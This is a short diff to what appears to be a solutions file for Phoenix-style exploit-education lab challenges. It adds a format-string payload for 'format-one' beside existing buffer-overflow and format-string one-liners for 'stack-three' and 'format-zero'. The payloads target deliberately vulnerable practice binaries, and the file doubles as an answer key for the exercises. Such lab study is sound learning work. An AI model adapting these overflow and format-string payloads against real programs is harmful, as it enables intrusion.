@@ -118,3 +118,7 @@ python3 -c 'print("A"*63 + "\x9d\x06\x40")' | ./stack-three
 **format-zero**
 
 python3 -c 'print("%33x")' |./format-zero
+
+**format-one**
+
+python3 -c 'print("%31x"+","+"lOvE")' |./format-one
